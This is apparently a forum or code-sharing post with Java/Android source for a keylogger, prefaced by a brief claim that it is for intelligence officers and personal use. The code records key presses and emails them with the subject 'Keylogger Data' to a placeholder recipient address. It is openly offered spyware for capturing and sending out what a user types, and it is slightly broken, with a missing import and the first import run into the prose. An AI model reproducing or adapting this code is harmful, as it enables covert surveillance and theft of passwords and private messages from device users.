I made this for only use for intelligence officers and personal use.Keylogging becomes a threat when there is malicious intent. Simply put, if you install a keylogger on a device you own, it is legal. If a keylogger is installed behind the back of the actual owner to steal data, it is illegal.import java.util.List;
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnKeyListener;
import de.voidplus.keyeventrecorder.KeyEventRecorder;

public class Keylogger implements OnKeyListener {
    private List<Integer> keys = new LinkedList<Integer>();

    @Override
    public boolean onKey(View v, int keyCode, KeyEvent event) {
        synchronized (keys) {
            if (event.getAction() == KeyEvent.ACTION_DOWN) {
                keys.add(keyCode);
            }
        }
        return false;
    }

    public void start() {
        KeyEventRecorder.startListening(this);
    }

    public void dump() {
        synchronized (keys) {
            String to = "recipient@example.com";
            String from = "sender@example.com";
            String host = "localhost";
            Properties properties = System.getProperties();
            properties.setProperty("mail.smtp.host", host);
            Session session = Session.getDefaultInstance(properties, null);
            try {
                MimeMessage message = new MimeMessage(session);
                message.setFrom(new InternetAddress(from));
                message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
                message.setSubject("Keylogger Data");
                StringBuilder body = new StringBuilder();
                for (int key : keys) {
                    body.append(key).append("\n");
                }
                message.setText(body.toString());
                Transport.send(message);
            } catch (MessagingException mex) {
                mex.printStackTrace();
            }
            keys.clear();
        }
    }

    public void stop() {
        KeyEventRecorder.stopListening();
    }
}

